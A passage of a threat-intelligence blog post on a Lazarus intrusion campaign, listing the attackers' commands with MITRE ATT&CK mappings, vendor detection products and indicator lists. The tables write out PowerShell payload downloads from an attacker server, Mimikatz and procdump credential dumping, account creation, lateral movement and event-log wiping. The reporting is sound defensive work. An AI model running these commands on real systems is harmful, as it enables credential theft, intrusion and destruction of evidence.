<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">cmd.exe /Q /c echo dsquery computer ^&gt; \\127.0.0.1\C$\&lt;impacket_log_file&gt; 2^&gt;^&amp;1</td><td>Domain Account Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1087/002</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /Q /c echo dsquery group -name GroupName ^&gt; \\127.0.0.1\C$\&lt;impacket_log_file&gt; 2^&gt;^&amp;1</td><td>Domain Account Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1087/002</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /Q /c echo dsquery computer -name ComputerName ^&gt; \\127.0.0.1\C$\&lt;impacket_log_file&gt; 2^&gt;^&amp;1</td><td>Domain Account Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1087/002</a>]</td></tr><tr><td class="threat-name-col">cmd.exe /Q /c echo dsquery user -name UserName ^&gt; \\127.0.0.1\C$\&lt;impacket_log_file&gt;t 2^&gt;^&amp;1</td><td>Domain Account Discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1087/002</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br></p><h3 id="unauthorized-account-creations">Unauthorized account creations</h3><p><br>In most instances, the attackers instrumented the reverse shell to create their own user accounts on the endpoints they had initial access to. Similar activity was also seen being conducted via the VSingle implant as it was propagated across an enterprise.</p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">net1 group /domain</td><td>Domain discovery [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1087/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1087/002</a>]</td></tr><tr><td class="threat-name-col">net1 user &lt;username&gt; &lt;password&gt; /domain</td><td>Create Account [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1136/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1136/002</a>]</td></tr><tr><td class="threat-name-col">net1 user &lt;username&gt; /active:yes /domain</td><td>Create Account [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1136/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1136/002</a>]</td></tr><tr><td class="threat-name-col">net1 group &lt;groupname&gt; /add /domain</td><td>Create Account [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1136/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1136/002</a>]</td></tr><tr><td class="threat-name-col">net1 group &lt;groupname&gt; &lt;username&gt; /add /domain</td><td>Create Account [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1136/002/&quot;}" href="https://attack.mitre.org/techniques/T1087/002/">T1136/002</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h3 id="additional-tools-used">Additional tools used</h3><p>In some cases, the attackers deployed commonly used tools often seen from other threat actors.</p><h4 id="mimikatz">Mimikatz</h4><p><br>The attackers downloaded the Mimikatz tool from their server, inside a .rar archive protected with a password, which prevents any kind of detection by network intrusion prevention systems.</p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('http://&lt;remote_location&gt;/mi.tmp', '&lt;local_path&gt;\m.tmp')</td><td>Download Payloads [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1608/001/&quot;}" href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>]</td></tr><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('http://&lt;remote_location&gt;/mi64.tmp', '&lt;local_path&gt;\mi.tmp')</td><td>Download Payloads [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1608/001/&quot;}" href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>]</td></tr><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('http://&lt;remote_location&gt;/mm.rar', '&lt;local_path&gt;\mm.tmp')</td><td>Download Payloads [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1608/001/&quot;}" href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>]</td></tr><tr><td class="threat-name-col">&lt;local_path&gt;\rar.exe e &lt;local_path&gt;\m.tmp &lt;local_path&gt;\ -p&lt;password&gt;</td><td>Extract files [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1140/&quot;}" href="https://attack.mitre.org/techniques/T1140/">T1140</a>]</td></tr><tr><td class="threat-name-col">&lt;local_path&gt;\mi.exe privilege::debug sekurlsa::logonPasswords exit</td><td>OS Credential Dumping [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/001/&quot;}" href="https://attack.mitre.org/techniques/T1003/001/">T1003/001</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h4 id="procdump">Procdump</h4><p><br>Along with Mimikatz, the attackers also used procdump to dump the LSASS memory to a file on disk.</p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('http://&lt;remote_location&gt;/pd64.tmp', '&lt;local_path&gt;\pd.tmp')</td><td>Download Payloads [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1608/001/&quot;}" href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>]</td></tr><tr><td class="threat-name-col">ren &lt;local_path&gt;\pd.tmp pd64.exe</td><td>Rename files</td></tr><tr><td class="threat-name-col">&lt;local_path&gt;\pd64.exe -accepteula -ma lsass &lt;local_path&gt;\z_pd.dmp</td><td>OS Credential Dumping [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1003/001/&quot;}" href="https://attack.mitre.org/techniques/T1003/001/">T1003/001</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h4 id="socks-proxy">Socks proxy</h4><p><br>In another instance, the attackers downloaded and set up a SOCKS proxy on the local endpoint, including the use of <a href="https://github.com/3proxy/3proxy">3proxy</a>.</p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">powershell -exec bypass -command (New-Object System.Net.WebClient).DownloadFile('http://&lt;remote_location&gt;/spr.tmp', '&lt;local_path&gt;\spr.tmp')</td><td>Download Payloads [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1608/001/&quot;}" href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>]</td></tr><tr><td class="threat-name-col">&lt;local_path&gt;\rar.exe e &lt;local_path&gt;\spr.tmp &lt;local_path_2&gt; -p&lt;password&gt;</td><td>Extract files [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1140/&quot;}" href="https://attack.mitre.org/techniques/T1140/">T1140</a>]</td></tr><tr><td class="threat-name-col">&lt;local_path_2&gt;\msconf.exe -i 84[.]38[.]133[.]145 -p &lt;Port_number&gt;</td><td>Proxy [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1090/&quot;}" href="https://attack.mitre.org/techniques/T1090/">T1090</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h2 id="implant-deployment-and-lateral-movement">Implant deployment and lateral movement</h2><p><br>Across the first endpoints compromised in the enterprises, we observed the attackers downloading their custom implants from remote locations and deploying and persisting them on the systems.<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">WMIC /node:&lt;Computer_Name&gt; process call create "powershell.exe (New-Object System.Net.Webclient).DownloadFile('&lt;remote_location&gt;/svhostw.exe','&lt;local_path&gt;\\svhostww.exe')"</td><td>Download Payloads [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1608/001/&quot;}" href="https://attack.mitre.org/techniques/T1608/001/">T1608/001</a>]</td></tr><tr><td class="threat-name-col">sc create &lt;service_name&gt; type= own type= interact start= auto error= ignore binpath= cmd /K start &lt;local_path_2&gt;\\svhostww.exe</td><td>Persistence [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1543/003/&quot;}" href="https://attack.mitre.org/techniques/T1543/003/">T1543/003</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<p><br><br>On the endpoints that were breached by performing lateral movement from an already compromised host, the implants were deployed either from a remote external location or the source host itself by opening up interactive shells and the use of implacket tools:<br><br></p>
<!--kg-card-begin: html-->
<table class="threats-table"><thead><tr><th width="400px">Command</th><th width="200px">Intent</th></tr></thead><tbody><tr><td class="threat-name-col">powershell.exe Enter-PSSession</td><td>Remote Access [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1219/&quot;}" href="https://attack.mitre.org/techniques/T1219/">T1219</a>]</td></tr><tr><td class="threat-name-col">powershell.exe Invoke-Command -ComputerName &lt;ComputerName&gt; -ScriptBlock {cmd.exe /c dir}</td><td>Remote Access [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1219/&quot;}" href="https://attack.mitre.org/techniques/T1219/">T1219</a>]</td></tr><tr><td class="threat-name-col">python wmiexec.py &lt;userid&gt;:&lt;password&gt;@&lt;local_IP_of_another_endpoint&gt; 1&gt; \\127.0.0.1\ADMIN$\&lt;impacket_log_file&gt; 2&gt;&amp;1</td><td>Remote Access [<a data-original-attrs="{&quot;data-original-href&quot;:&quot;https://attack.mitre.org/techniques/T1219/&quot;}" href="https://attack.mitre.org/techniques/T1219/">T1219</a>]</td></tr></tbody></table>
<!--kg-card-end: html-->
<h3 id="cleanup">Cleanup</h3><p><br>Once the backdoors and implants were persisted and activated on the endpoint, the reverse shell used to perform cleanup [<a href="https://attack.mitre.org/techniques/T1070/">T1070</a>], this included deleting all files in the infection folder along with the termination of the powershell tasks. The attacker-created accounts were removed and, finally, the Windows Event logs [<a href="https://attack.mitre.org/techniques/T1070/001/">T1070/001</a>] would be purged with the command below.<br><br>for /F tokens=* %1 in ('wevtutil.exe el') DO wevtutil.exe cl %1 1&gt; \\127.0.0.1\ADMIN$\&lt;log_file_name&gt; 2&gt;&amp;1</p><h3 id="manual-operations">Manual operations</h3><p><br>In multiple instances, the attackers mistyped commands on the infected endpoint via the reverse shell, indicating that the commands were being served by an operator manually operating the infections:</p>
<!--kg-card-begin: html-->
<table class="threats-table"><tbody><tr><td class="threat-name-col"><strong>ip config</strong><span>&nbsp;</span>/all</td></tr><tr><td class="threat-name-col">net<span>&nbsp;</span><strong>suer</strong></td></tr><tr><td class="threat-name-col">netstat -noa |<span>&nbsp;</span><strong>finstr<span>&nbsp;</span></strong>3389</td></tr><tr><td class="threat-name-col"><strong>powrshell</strong>.exe Get-AdUser -Filter * -Properties * | Select Name, logonCount</td></tr><tr><td class="threat-name-col"><strong>powrshell</strong>.exe Get-AdComputer -Filter * -Properties * | select Name, LastLogonDate, lastLogon, IPv4Address</td></tr></tbody></table>
<!--kg-card-end: html-->
<h2 id="coverage">Coverage</h2><p><br>Ways our customers can detect and block this threat are listed below.</p><figure class="kg-card kg-image-card"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRSt2bZ0s_jylBH3hvtVsyy2BPxtIW1fgYCwxrm3D0ozjjTK6qAiqnwSnwlmibiTHarKqaHuO8Ua6RVIOoVKcrrM8t4urg8rb4a2IpL1EsrMqo4KD1lhkQyuztLFYiNGEqOaMQRY5VuzCdtY17lRmYi6qyeX-Pc7_BNjz_NEIxh5NiIgsCEaLeNyduYw/w640-h622/image4.png" class="kg-image" alt="" loading="lazy" width="640" height="622"></figure><p><br><a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html">Cisco Secure Endpoint</a> (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free <a href="https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium=web-referral?utm_source=cisco&amp;utm_campaign=amp-free-trial&amp;utm_term=pgm-talos-trial&amp;utm_content=amp-free-trial">here.</a><br><br><a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">Cisco Secure Web Appliance</a> web scanning prevents access to malicious websites and detects malware used in these attacks.<br><br><a href="https://www.cisco.com/c/en/us/products/security/email-security/index.html">Cisco Secure Email</a> (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free <a href="https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium=web-referral&amp;utm_source=cisco&amp;utm_campaign=cmd-free-trial-request&amp;utm_term=pgm-talos-trial">here</a>.<br><br><a href="https://www.cisco.com/c/en/us/products/security/firewalls/index.html">Cisco Secure Firewall</a> (formerly Next-Generation Firewall and Firepower NGFW) appliances such as <a href="https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html">Threat Defense Virtual</a>, <a href="https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html">Adaptive Security Appliance</a> and <a href="https://meraki.cisco.com/products/appliances">Meraki MX</a> can detect malicious activity associated with this threat.<br><br><a href="https://www.cisco.com/c/en/us/products/security/threat-grid/index.html">Cisco Secure Malware Analytics</a> (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.<br><br><a href="https://umbrella.cisco.com/">Umbrella</a>, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella <a href="https://signup.umbrella.com/?utm_medium=web-referral?utm_source=cisco&amp;utm_campaign=umbrella-free-trial&amp;utm_term=pgm-talos-trial&amp;utm_content=automated-free-trial">here</a>.<br><br><a href="https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html">Cisco Secure Web Appliance</a> (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.<br><br>Additional protections with context to your specific environment and threat data are available from the <a href="https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html">Firewall Management Center</a>.<br><br><a href="https://signup.duo.com/?utm_source=talos&amp;utm_medium=referral&amp;utm_campaign=duo-free-trial">Cisco Duo</a> provides multi-factor authentication for users to ensure only those authorized are accessing your network.<br><br>Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on <a href="https://www.snort.org/products">Snort.org</a>.</p><h4 id="orbital-queries">Orbital Queries</h4><p><br>Cisco Secure Endpoint users can use <a href="https://orbital.amp.cisco.com/help/">Orbital Advanced Search</a> to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries on this threat, click <a href="https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/magicrat_file_artifact.yaml">here</a> and <a href="https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/vsingle_mutex.yaml">here</a>.</p><h2 id="iocs">IOCS</h2><p>The IOC list is also available in Talos' Github repo <a href="https://github.com/Cisco-Talos/IOCs/blob/main/2022/09/lazarus-three-rats.txt" rel="noreferrer">here</a>.</p><h3 id="vsingle">VSingle</h3><p>586F30907C3849C363145BFDCDABE3E2E4688CBD5688FF968E984B201B474730</p><h3 id="magicrat">MagicRAT</h3><p>8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5<br>c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f<br>dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469<br>90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4</p><h3 id="yamabotf">YamaBotf</h3><p>226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb</p><h3 id="procdump-1">Procdump</h3><p>16F413862EFDA3ABA631D8A7AE2BFFF6D84ACD9F454A7ADAA518C7A8A6F375A5<br>05732E84DE58A3CC142535431B3AA04EFBE034CC96E837F93C360A6387D8FAAD</p><h3 id="mimikatz-1">Mimikatz</h3><p>6FBB771CD168B5D076525805D010AE0CD73B39AB1F4E6693148FE18B8F73090B<br>912018AB3C6B16B39EE84F17745FF0C80A33CEE241013EC35D0281E40C0658D9<br>CAF6739D50366E18C855E2206A86F64DA90EC1CDF3E309AEB18AC22C6E28DC65</p><h3 id="3proxy">3Proxy</h3><p>2963a90eb9e499258a67d8231a3124021b42e6c70dacd3aab36746e51e3ce37e</p><h3 id="putty">PuTTY </h3><p>plink2AA1BBBE47F04627A8EA4E8718AD21F0D50ADF6A32BA4E6133EE46CE2CD13780<br>5A73FDD0C4D0DEEA80FA13121503B477597761D82CF2CFB0E9D8DF469357E3F8</p><h3 id="adfind">Adfind</h3><p>C92C158D7C37FEA795114FA6491FE5F145AD2F8C08776B18AE79DB811E8E36A3</p><h3 id="ips">IPs</h3><p>104[.]155[.]149[.]103<br>40[.]121[.]90[.]194<br>185[.]29[.]8[.]162<br>146[.]4[.]21[.]94<br>46[.]183[.]221[.]109<br>84[.]38[.]133[.]145<br>109[.]248[.]150[.]13<br>155[.]94[.]210[.]11<br>192[.]186[.]183[.]133<br>54[.]68[.]42[.]4<br>84[.]38[.]133[.]145<br>213[.]180[.]180[.]154</p><h3 id="urls">URLS</h3><p>hxxp[://]104[.]155[.]149[.]103/2-443[.]ps1<br>hxxp[://]104[.]155[.]149[.]103/8080[.]ps1<br>hxxp[://]104[.]155[.]149[.]103/mi64[.]tmp<br>hxxp[://]104[.]155[.]149[.]103/mi[.]tmp<br>hxxp[://]104[.]155[.]149[.]103/mm[.]rar<br>hxxp[://]104[.]155[.]149[.]103/pd64[.]tmp<br>hxxp[://]104[.]155[.]149[.]103/rar[.]tmp<br>hxxp[://]104[.]155[.]149[.]103/spr[.]tmp<br>hxxp[://]104[.]155[.]149[.]103/t[.]tmp<br>hxxp[://]104[.]155[.]149[.]103/update[.]tmp<br>hxxp[://]109[.]248[.]150[.]13:8080/1<br>hxxp[://]146[.]4[.]21[.]94/tmp/data_preview/virtual[.]php<br>hxxp[://]185[.]29[.]8[.]162:443/1[.]tmp<br>hxxp[://]40[.]121[.]90[.]194/11[.]jpg<br>hxxp[://]40[.]121[.]90[.]194/300dr[.]cert<br>hxxp[://]40[.]121[.]90[.]194/b[.]cert<br>hxxp[://]40[.]121[.]90[.]194/qq[.]cert<br>hxxp[://]40[.]121[.]90[.]194/ra[.]cert<br>hxxp[://]40[.]121[.]90[.]194/Rar[.]jpg<br>hxxp[://]40[.]121[.]90[.]194/tt[.]rar<br>hxxp[://]46[.]183[.]221[.]109//dfdfdfdfdfdfdfdfdfaflakjdfljaldjfladfljaldkfjlajdsflajdskf/huntertroy[.]exe<br>hxxp[://]46[.]183[.]221[.]109//dfdfdfdfdfdfdfdfdfaflakjdfljaldjfladfljaldkfjlajdsflajdskf/svhostw[.]exe<br>hxxp[://]84[.]38[.]133[.]145/board[.]html<br>hxxp[://]84[.]38[.]133[.]145/header[.]xml<br>hxxp[://]www[.]ajoa[.]org/home/manager/template/calendar[.]php<br>hxxp[://]www[.]ajoa[.]org/home/rar[.]tmp<br>hxxp[://]www[.]ajoa[.]org/home/tmp[.]ps1<br>hxxp[://]www[.]ajoa[.]org/home/ztt[.]tmp<br>hxxp[://]www[.]orvi00[.]com/ez/admin/shop/powerline[.]tmp<br></p><h3 id="vsingle-c2s">VSingle C2s</h3><p>hxxps[://]tecnojournals[.]com/review<br>hxxps[://]semiconductboard[.]com/xml<br>hxxp[://]cyancow[.]com/find</p><h3 id="magicrat-c2s">MagicRAT C2s</h3><p>hxxp[://]155[.]94[.]210[.]11/news/page[.]php<br>hxxp[://]192[.]186[.]183[.]133/bbs/board[.]php<br>hxxp[://]213[.]32[.]46[.]0/board[.]php<br>hxxp[://]54[.]68[.]42[.]4/mainboard[.]php<br>hxxp[://]84[.]38[.]133[.]145/apollom/jeus[.]php<br>hxxp[://]mudeungsan[.]or[.]kr/gbbs/bbs/template/g_botton[.]php<br>hxxp[://]www[.]easyview[.]kr/board/Kheader[.]php<br>hxxp[://]www[.]easyview[.]kr/board/mb_admin[.]php</p><h3 id="yamabot-c2s">YamaBot C2s</h3><p>hxxp[://]213[.]180[.]180[.]154/editor/session/aaa000/support[.]php</p>
        </div>
    </section>
    <div class="social-media-wrapper">
    <h5>Share this post</h5>
    <ul class="social-media-share-list">
        <li>
            <a class="share-facebook" title="Share this on Facebook" data-text="Lazarus and the tale of three RATs" data-href="https://blog.talosintelligence.com/lazarus-three-rats/" rel="nofollow" target="_blank" href="https://www.facebook.com/sharer.php?u=https://blog.talosintelligence.com/lazarus-three-rats/"></a>
        </li>
        <li>
            <a class="share-x" title="Post This" data-text="Lazarus and the tale of three RATs" data-href="https://blog.talosintelligence.com/lazarus-three-rats/" rel="nofollow" target="_blank" href="https://x.com/share?url=https://blog.talosintelligence.com/lazarus-three-rats/"></a>
        </li>
        <li>
            <a class="share-linkedin" title="Share this on LinkedIn" data-text="Lazarus and the tale of three RATs" data-href="https://blog.talosintelligence.com/lazarus-three-rats/" rel="nofollow" target="_blank" href="https://www.linkedin.com/sharing/share-offsite/?url=https://blog.talosintelligence.com/lazarus-three-rats/"></a>
        </li>
        <li>
            <a class="share-reddit" title="Reddit This" data-text="Lazarus and the tale of three RATs" data-href="https://blog.talosintelligence.com/lazarus-three-rats/" rel="nofollow" target="_blank" href="https://www.reddit/submit?url=https://blog.talosintelligence.com/lazarus-three-rats/"></a>
        </li>
        <li>
            <a class="share-email" title="Email This" href="mailto:?body=Lazarus and the tale of three RATshttps://blog.talosintelligence.com/lazarus-three-rats/"></a>
        </li>
    </ul>
</div></article>
                    </div>
                </div>
                <div class="col-lg alt-layout-row-dk sidebar" id="side-bar">


                            <h4>Related Content</h4>
                                <div class="sidebar-snippet-wrapper">
                                    <a href="/css-abuse-for-evasion-and-tracking/">
                                        <h3>Abusing with style: Leveraging cascading style sheets for evasion and tracking</h3>
                                        <span  class="preview-attributes">March 13, 2025 06:00</span>
                                        <p>Cascading Style Sheets (CSS) are ever present in modern day web browsing, however its far from their own use. This blog will detail the ways adversaries use CSS in email campaigns for evasion and tracking.</p>
                                    </a>
                                </div>
                                <div class="sidebar-snippet-wrapper">
                                    <a href="/new-persistent-attacks-japan/">
                                        <h3>Unmasking the new persistent attacks on Japan</h3>
                                        <span  class="preview-attributes">March 6, 2025 06:00</span>
                                        <p>Cisco Talos has discovered an active exploitation of CVE-2024-4577 by an attacker in order to gain access to the victim&#39;s machines and carry out post-exploitation activities.</p>
                                    </a>
                                </div>
                                <div class="sidebar-snippet-wrapper">
                                    <a href="/lotus-blossom-espionage-group/">
                                        <h3>Lotus Blossom espionage group targets multiple industries with different versions of Sagerunex and hacking tools</h3>
                                        <span  class="preview-attributes">February 27, 2025 06:00</span>
                                        <p>Lotus Blossom espionage group targets multiple industries with different versions of Sagerunex and hacking tools</p>
                                    </a>
                                </div>
                </div>
            </div>
        </div>
    </main>



    <footer id="footer">
    <div class="row footer_nav_wrapper">
        <div class="col-xl-10 col-12">
            <div class="multi-col-list-wrapper">
                <ul class="footer-parent-list">
                    <li class="footer-links-group">
                        <ul>
                            <li>
                                <h6><a href="https://talosintelligence.com/reputation">Intelligence Center</a></h6>
                            </li>
                            <li><a href="https://talosintelligence.com/reputation_center">Intelligence Search</a></li>
                            <li><a href="https://talosintelligence.com/reputation_center/email_rep">Email &amp; Spam Trends</a></li>
                        </ul>
                    </li>
                    <li class="footer-links-group">
                        <ul>
                            <li>
                                <h6><a href="https://talosintelligence.com/vulnerability_info">Vulnerability Research</a></h6>
                            </li>
                            <li><a href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
                            <li><a href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
                        </ul>
                    </li>
                    <li class="footer-links-group">
                         <ul>
                            <li>
                                <h6><a href="https://talosintelligence.com/incident_response">Incident Response</a></h6>
                            </li>
                            <li>
                                <a href="https://talosintelligence.com/incident_response/services#reactive-services">Reactive Services</a>
                            </li>
                            <li>
                                <a href="https://talosintelligence.com/incident_response/services#proactive-services">Proactive Services</a>
                            </li>
                            <li>
                                <a href="https://talosintelligence.com/incident_response/contact">Emergency Support</a>
                            </li>
                        </ul>
                    </li>
                    <li class="footer-links-group">
                        <ul>
                            <li>
                                <h6>Security Resources</h6>
                            </li>
                            <li><a href="https://talosintelligence.com/software">Open Source Security Tools</a></li>
                            <li><a href="https://talosintelligence.com/categories">Intelligence Categories Reference</a></li>
                            <li><a href="https://talosintelligence.com/secure-endpoint-naming">Secure Endpoint Naming Reference</a></li>
                        </ul>
                    </li>
                    <li class="footer-links-group">
                        <ul>
                            <li>
                                <h6>Media</h6>
                            </li>
                            <li><a href="https://blog.talosintelligence.com">Talos Intelligence Blog</a></li>
                            <li><a href="https://blog.talosintelligence.com/category/threat-source-newsletter/">Threat Source Newsletter</a></li>
                            <li><a href="https://talosintelligence.com/podcasts/shows/beers_with_talos">Beers with Talos Podcast</a></li>
                            <li><a href="https://talosintelligence.com/podcasts/shows/talos_takes">Talos Takes Podcast</a></li>
                            <li><a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured">Talos Videos</a></li>
                        </ul>
                    </li>
                    <li class="footer-links-group">
                        <ul>
                            <li>
                                <h6>Support</h6>
                            </li>
                            <li><a href="https://support.talosintelligence.com">Support Documentation</a></li>
                        </ul>
                    </li>
                    <li class="footer-links-group">
                        <ul>
                            <li>
                                <h6>Company</h6>
                            </li>
                            <li><a href="https://talosintelligence.com/about">About Talos</a></li>
                            <li><a href="https://talosintelligence.com/careers">Careers</a></li>
                            <li><a target="_blank" href="https://www.cisco.com/c/en/us/products/security/product-listing.html">Cisco Security</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
        <div class="col-xl-2 col-12 connect_social">
            <div class="connect-footer-section-wrapper">
                <h6>Follow us</h6>
                <ul>
                    <li>
                        <a target="_blank" href="https://x.com/talossecurity"><div class="footer-media-icon" id="footer-media-icon-x"></div>
                        </a></li>
                    <li>
                        <a target="_blank" href="https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured"><div class="footer-media-icon" id="footer-media-icon-youtube"></div>
                        </a></li>
                    <li>
                        <a target="_blank" href="https://www.linkedin.com/company/cisco-talos-intelligence-group/"><div class="footer-media-icon" id="footer-media-icon-linkedin"></div>
                        </a></li>
                </ul>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-12 footer_corporate">
            <a target="_blank" href="http://tools.cisco.com/security/center/home.x"><img alt="Cisco" src="https://blog.talosintelligence.com/assets/images/logo_cisco_white.svg">
            </a><p class="copyright">
            Â©
            <span id='current-year'></span>
            Cisco Systems, Inc. and/or its affiliates. All rights
            reserved. View our
            <a target="_blank" class="underline" href="http://www.cisco.com/web/siteassets/legal/privacy_full.html">Privacy Policy.</a>
        </p>
        </div>
    </div>
</footer>
    


<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://blog.talosintelligence.com/assets/js/jquery-3.6.0.min.js?v=9ad87340f9"></script>
<script src="https://blog.talosintelligence.com/assets/js/popper.min.js?v=9ad87340f9"></script>
<script src="https://blog.talosintelligence.com/assets/js/bootstrap.bundle.min.js?v=9ad87340f9"></script>
<script src="https://blog.talosintelligence.com/assets/js/date.js?v=9ad87340f9"></script>
<script src="https://blog.talosintelligence.com/assets/js/prism.js?v=9ad87340f9"></script>
<script src="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/js/ghost-theme-utils.min.js" async defer></script>


<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"922983e92847d6d5","version":"2025.1.0","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"35f8ae698f9d471b83b846a751388737","b":1}' crossorigin="anonymous"></script>
</body>

</html>